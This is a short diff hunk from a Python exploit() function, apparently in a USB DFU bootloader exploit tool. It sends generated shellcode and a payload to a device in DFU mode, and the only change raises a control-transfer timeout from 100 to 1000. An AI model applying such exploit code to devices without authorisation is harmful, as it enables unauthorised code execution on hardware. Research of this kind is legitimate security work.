@@ -137,7 +137,7 @@ def exploit():
   dfu.reset_counters(device)
   dfu.send_data(device, generate_shellcode(chosenConfig.constants))
   dfu.send_data(device, payload)
-  assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(payload), 100)) == len(payload)
+  assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(payload), 1000)) == len(payload)
   dfu.release_device(device)
 
   time.sleep(0.01)
